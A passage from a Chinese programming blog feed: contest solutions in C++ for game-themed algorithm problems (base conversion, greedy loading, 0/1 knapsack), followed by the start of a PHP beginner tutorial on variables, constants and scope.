title="题目描述"></a>题目描述</h4><p>元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。</p><p>是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。</p><p>等式1：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/0cbe792df38c46da.png" alt="img"></p><p>等式2：</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/adc47f3a0484d66c.png" alt="img"></p><h4 id="输入-20"><a href="#输入-20" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例。</p><p>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p><p>接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。</p><h4 id="输出-20"><a href="#输出-20" class="headerlink" title="输出"></a>输出</h4><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。</p><h4 id="样例输入-20"><a href="#样例输入-20" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">7</span><br><span class="line">1433223</span><br><span class="line">193224</span><br></pre></td></tr></table></figure><h4 id="样例输出-20"><a href="#样例输出-20" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">15116331</span><br><span class="line">1433223</span><br></pre></td></tr></table></figure><h4 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h4><p>测试数据均大于等于1，不用特判0</p><h4 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h4><p>其实就是10进制转7进制</p><h4 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e8</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c, r;</span><br><span class="line">    r = n % <span class="number">7</span>;</span><br><span class="line">    c = n / <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (c &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        convert(c);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        convert(n);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-C-圣诞恋歌——貂蝉"><a href="#问题-C-圣诞恋歌——貂蝉" class="headerlink" title="问题 C:圣诞恋歌——貂蝉"></a>问题 C:圣诞恋歌——貂蝉</h3><h4 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h4><p>貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p><h4 id="输入-21"><a href="#输入-21" class="headerlink" title="输入"></a>输入</h4><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。</p><h4 id="输出-21"><a href="#输出-21" class="headerlink" title="输出"></a>输出</h4><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p><h4 id="样例输入-21"><a href="#样例输入-21" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">81</span><br></pre></td></tr></table></figure><h4 id="样例输出-21"><a href="#样例输出-21" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">121</span><br></pre></td></tr></table></figure><h4 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h4><p>没思路，喝瓶汽水冷静下？</p><h4 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h4><p>每次攻击<code>ans++</code>，攻击次数<code>n--</code>，<code>count</code>来记录攻击的次数，每攻击3次<code>（count==3）</code>，则攻击次数加1（白送一次），同时将count清0，知道所剩攻击次数为0，停止。</p><h4 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">//每3次攻击,就多一次攻击</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n++;</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += <span class="number">1</span>;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h3><h4 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h4><p>孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p><p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p><h4 id="输入-22"><a href="#输入-22" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。</p><p>每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p><h4 id="输出-22"><a href="#输出-22" class="headerlink" title="输出"></a>输出</h4><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p><h4 id="样例输入-22"><a href="#样例输入-22" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">10 4</span><br><span class="line">3 5 2 4</span><br><span class="line">20 9</span><br><span class="line">3 5 2 4 6 1 8 5 9</span><br></pre></td></tr></table></figure><h4 id="样例输出-22"><a href="#样例输出-22" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h4 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h4><p>1.小朋友的体重可能相同 2.船可以满载</p><h4 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h4><p>贪心算法，先对小朋友按体重升序排列，然后体重小的优先上船，直到容量满为止。</p><h4 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> t, m, n;</span><br><span class="line"><span class="keyword">int</span> w[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(w, w + n);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, c = m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (w[i] &lt;= c)</span><br><span class="line">            &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                c -= w[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h3><h4 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h4><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p><p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p><p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？</p><h4 id="输入-23"><a href="#输入-23" class="headerlink" title="输入"></a>输入</h4><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。</p><p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。</p><h4 id="输出-23"><a href="#输出-23" class="headerlink" title="输出"></a>输出</h4><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p><h4 id="样例输入-23"><a href="#样例输入-23" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h4 id="样例输出-23"><a href="#样例输出-23" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h4 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h4><p>结果可能超过int范围，请使用long long类型变量</p><h4 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h4><p>说了这么多，其实就是经典的01背包问题。</p><p>之前有一道01背包用<code>cin/cout</code>过不了，只能用<code>scanf/printf</code>，所以到时候看情况吧..</p><h4 id="代码-17"><a href="#代码-17" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10005</span>;</span><br><span class="line">ll dp[maxn][maxn];</span><br><span class="line">ll w[maxn], p[maxn];</span><br><span class="line">ll c, n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">    <span class="comment">//scanf("%d", &amp;t);</span></span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; c &gt;&gt; n;</span><br><span class="line">        <span class="comment">//scanf("%lld %lld", &amp;c, &amp;n);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; w[i] &gt;&gt; p[i];</span><br><span class="line">            <span class="comment">//scanf("%lld %lld", &amp;w[i], &amp;p[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        ll jMax = <span class="built_in">min</span>(w[n] - <span class="number">1</span>, c);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">            dp[n][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = w[n]; j &lt;= c; j++)</span><br><span class="line">            dp[n][j] = p[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            jMax = <span class="built_in">min</span>(w[i] - <span class="number">1</span>, c);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= jMax; j++)</span><br><span class="line">                dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = w[i]; j &lt;= c; j++)</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j - w[i]] + p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">1</span>][c] = dp[<span class="number">2</span>][c];</span><br><span class="line">        <span class="keyword">if</span> (c &gt; w[<span class="number">1</span>])</span><br><span class="line">            dp[<span class="number">1</span>][c] = <span class="built_in">max</span>(dp[<span class="number">2</span>][c], dp[<span class="number">2</span>][c - w[<span class="number">1</span>]] + p[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; dp[<span class="number">1</span>][c] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//printf("%lld\n", dp[1][c]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP快速入门</title>
      <link href="/2020/09/07/phprumen/"/>
      <url>/2020/09/07/phprumen/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇PHP快速入门的总结</p></blockquote><a id="more"></a> <h2 id="hello，world"><a href="#hello，world" class="headerlink" title="hello，world"></a>hello，world</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><ul><li>PHP 脚本可放置于文档中的任何位置</li><li>PHP 脚本以 <code>&lt;?php</code> 开头，以 <code>?&gt;</code> 结尾，文件后缀名.php</li><li>语句以分号结尾 <code>;</code></li><li>注释：<code># 单行注释</code>，<code>// 单行注释</code>，<code>/* 多行注释 */</code></li><li>变量名对大小写敏感：<code>$color</code> 和 <code>$Color</code> 是不同的变量</li><li><code>用户定义的函数</code>、<code>类</code>和<code>关键字</code>（例如 if、else、echo 等等）都对大小写不敏感：<code>Echo &quot;Ok&quot;</code> 和 <code>echo &quot;Ok&quot;</code> 是一样的效果</li><li>输出内容到网页上用 <code>echo</code></li><li><code>var_dump()</code>：会返回变量的数据类型和值，调试的时候很有用: var_dump(“text”): <code>string(4) &quot;text&quot;</code>;</li><li><code>print_r</code>：Prints human-readable information about a variable</li></ul><h2 id="PHP变量规则："><a href="#PHP变量规则：" class="headerlink" title="PHP变量规则："></a>PHP变量规则：</h2><ul><li>变量以 <code>$</code> 符号开头，其后是变量的名称</li><li>变量名称必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _）</li><li>变量名称对大小写敏感（$y 与 $Y 是两个不同的变量）</li></ul><h2 id="创建变量"><a href="#创建变量" class="headerlink" title="创建变量"></a>创建变量</h2><ul><li>创建变量的时候不指定变量的类型</li><li>变量没有类型</li><li>PHP 自动的根据变量的值转换为正确的数据类型</li><li>变量会在首次赋值时被创建</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x &#x3D; 10; &#x2F;&#x2F; 这样就创建好了一个变量</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="创建常量"><a href="#创建常量" class="headerlink" title="创建常量"></a>创建常量</h2><ul><li>使用define()函数创建常量 它使用三个参数</li><li>首个参数定义常量的名称</li><li>第二个参数定义常量的值</li><li>可选的第三个参数规定常量是否对大小写敏感，默认是false（大小写敏感）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"TIME_ZONE"</span>, <span class="string">"Beijin"</span>);</span><br><span class="line"><span class="keyword">echo</span> TIME_ZONE; <span class="comment">// Beijin</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><ul><li><code>global</code>：<code>函数之外声明</code>的变量拥有 global 作用域，只能在函数以外进行访问</li><li><code>local</code> ：<code>函数内部声明</code>的变量拥有 local 作用域，只能在函数内部进行访问</li><li><code>static</code>：变量在函数执行完后不会被删除，就像 C 语言中用 static</li></ul><p><code>$GLOBALS[index]</code> 的数组中存储了所有的全局变量，下标为变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="number">10</span>; <span class="comment">// 全局变量</span></span><br><span class="line">$y = <span class="number">20</span>; <span class="comment">// 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123; <span class="comment">// 函数定义</span></span><br><span class="line">    <span class="keyword">global</span> $x; <span class="comment">// 函数内访问全局变量需要在全局变量前加 global 关键字</span></span><br><span class="line">    $z = <span class="number">30</span>;   <span class="comment">// 局部变量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出：[x: 10, y: , z: 30]，函数内不能访问全局变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"[x: $x, y: $y, z: $z]&lt;br&gt;"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 用 GLOBAL 数组访问全局变量  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"x: &#123;$GLOBALS['x']&#125; &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// 执行函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：[x: 10, y: 20, z: ]，函数外不能访问局部变量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[x: $x, y: $y, z: $z]&lt;br&gt;"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"static: $x &lt;br&gt;"</span>;</span><br><span class="line">    $x++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// static: 0 </span></span><br><span class="line">bar(); <span class="comment">// static: 1</span></span><br><span class="line">bar(); <span class="comment">// static: 2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code><br><code>&gt;</code> <code>&lt;</code> <code>&gt;=</code> <code>&lt;=</code> <code>!=</code> <code>==</code> <code>===</code> <code>||</code> <code>&amp;&amp;</code><br><code>前置++</code> <code>后置++</code> <code>前置--</code> <code>后置--</code><br><code>.</code> <code>.=</code> 用于字符串连接</p><p>比较特别的是 <code>==</code>(值相同就认为相等) <code>===</code>(值相同，并且类型也要相同)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 